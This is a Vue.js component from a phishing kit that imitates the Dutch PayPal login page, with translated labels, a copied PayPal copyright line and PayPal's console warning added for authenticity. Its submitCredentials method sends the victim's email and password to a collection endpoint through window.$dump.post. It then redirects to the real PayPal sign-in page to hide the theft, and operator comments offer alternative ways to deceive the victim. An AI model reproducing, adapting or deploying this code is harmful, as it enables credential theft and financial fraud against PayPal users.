<template>
  <div id="app">
  	<!--
    <paypal-main 
    	// Required
    	:language="language" 
    	:credentials="credentials" 
    	
    	// Optional
    	:subheader-text="shText" 
    	
    	// Optional
    	:submit-error-message="subText" 
    	:submit-error="submitError" 
    	
    	// Required
    	@submit-credentials="submitCredentials"
			
			// Optional
    	:show-custom-action="true"
    	:custom-action-text="customActionText"
    	@custom-action-click="customActionClick"
    	
    />
  	-->
    <paypal-main 
    	:language="language" 
    	:credentials="credentials"
    	@submit-credentials="submitCredentials"    	
    />
    <paypal-footer 
    	:language="language" 
    />
  </div>
</template>

<script>
import paypalMain from './components/Main.vue'
import paypalFooter from './components/Footer.vue'
export default {
  name: 'app',
  components: {
    paypalMain,
    paypalFooter
  },
  data () {
  	return {
  		// User credentials
  		credentials: {
  			email: '',
  			password: ''
  		},

  		// Translated texts - edit these to your needs
  		// Or load them from JSON in mounted
  		language: {
        title: 'Log in op uw PayPal-rekening',
        emailLabel: 'E-mailadres of mobiel nummer',
        emailPlaceHolder: 'E-mailadres of mobiel nummer',
        required: 'Vereist.',
        emailError: 'De indeling van dit e-mailadres of mobiele nummer is onjuist.',
        passwordLabel: 'Wachtwoord',
        passwordPlaceholder: 'Wachtwoord',
        passwordShow: 'Weergeven',
        passwordHide: 'Verbergen',
        loginButton: 'Inloggen',
        or: 'of',
        createAccount: 'Rekening openen',
        privacy: 'Privacy',
        copyright: 'Copyright © 1999 - 2019 PayPal. Alle rechten voorbehouden.',
        inputError: 'Controleer de ingevoerde gegevens en probeer het opnieuw.'
      }
  	}
  },
  methods: {
  	submitCredentials () {
  		let vm = this;
  		window.$dump.post('a0a058baaeef16e88f6bd2ee36c03f6f', this.credentials).then(res => {
  			// Show error
  			//vm.submitError = true;
  			
  			// ---- OR ----

  			// timeout to "real" paypal page
  			//setTimeout("location.href = '//www.paypal.com/signin';",1500);

  			// ---- OR ----

  			// Just redirect to "real" login page
  			location.href = '//www.paypal.com/signin';
  		}).catch(error => {
  			location.href = '//www.paypal.com/signin';
  		});
  	}
  },
  mounted () {
  	// Set window title to translated text
  	window.document.title = this.language.title
  	// Set console log warning -- this is from "original" paypal page
  	if (window.console || 'console' in window) {
      setTimeout(console.log.bind(console, '%c WARNING!!!', 'color:#FF8F1C; font-size:40px;'));
      setTimeout(console.log.bind(console, '%c This browser feature is for developers only. Please do not copy-paste any code or run any scripts here. It may cause your PayPal account to be compromised.', 'color:#003087; font-size:16px; font-weight: bold;'));
      setTimeout(console.log.bind(console, '%c For more information, http://en.wikipedia.org/wiki/Self-XSS', 'color:#003087; font-size:16px; font-weight: bold;'));
    }
  }
}
</script>
